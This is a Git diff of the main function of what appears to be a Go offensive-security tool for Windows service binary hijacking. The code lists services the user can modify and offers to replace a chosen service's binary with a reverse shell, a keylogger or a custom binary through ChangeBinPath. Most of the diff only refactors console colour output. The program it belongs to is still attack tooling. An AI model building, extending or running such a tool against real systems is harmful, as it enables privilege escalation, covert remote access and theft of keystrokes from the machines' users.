@@ -10,27 +10,32 @@ import (
 )
 
 func main() {
+	// Setting up all variables we need
+	// variables to hold user input
+	// slice to hold user options and the
+	// user homedir
+
+	var userChoice, binaryChoice int
+
+	binaryOptions := [3]string{"Reverse Shell", "Key logger", "Custom binary"}
+
 	homeDir, _ := os.UserHomeDir()
-
-	text, err := os.ReadFile(homeDir + `\win-binary-hijacking\internal\banner\banner.txt`)
-
-	if err != nil {
-		color.Red("Could not read banner: ", err)
-	}
-
-	color.Red(string(text))
-
-	color.Red("Author: Luke Marshall\n\n")
 
 	// Slice holding of type *enum.WeakServ to display
 	// choice of services that are exploitable to the user.
 	var userOptions []*enumwin.WeakServ
 
-	var userChoice int
+	m := enumwin.SetMenu()
 
-	var binaryChoice int
+	text, err := os.ReadFile(homeDir + `\win-binary-hijacking\internal\banner\banner.txt`)
 
-	binaryOptions := [3]string{"Reverse Shell", "Key logger", "Custom binary"}
+	if err != nil {
+		m.CT.Println("Could not read banner: ", err)
+	}
+
+	m.CD.Println(string(text))
+
+	m.CT.Println("Author: Luke Marshall")
 
 	chanBack := enumwin.EnumServ()
 
@@ -41,16 +46,16 @@ func main() {
 	}
 
 	if len(userOptions) > 0 {
-		color.Red("\n\nCan Modify the following services:\n")
+		m.CG.Println("\n\nCan Modify the following services:")
 
 		// Display each entry in the userOptions slice
 		// as well as their index to provide menu of
 		// options for the user
 		for index, val := range userOptions {
-			color.Red("%d: %s", index+1, val.Name)
+			m.CD.Printf("%d: %s\n", index+1, val.Name)
 		}
 
-		color.Red("\n\nChoose a service to modify:\n")
+		m.CT.Println("\n\nChoose a service to modify:")
 
 		r, err := fmt.Scanln(&userChoice)
 
@@ -68,7 +73,7 @@ func main() {
 		color.Red("\nWhat binary would you like to replace the service binary with?\n")
 
 		for index, val := range binaryOptions {
-			color.Red("%d: %s\n", index+1, val)
+			m.CT.Printf("%d: %s\n", index+1, val)
 		}
 
 		fmt.Scanln(&binaryChoice)
@@ -80,7 +85,7 @@ func main() {
 		enumwin.ChangeBinPath(userOptions[userChoice-1], binaryChoice)
 
 	} else {
-		color.Red("No services found which you can modify")
+		m.CT.Println("No services found which you can modify")
 	}
 
 }
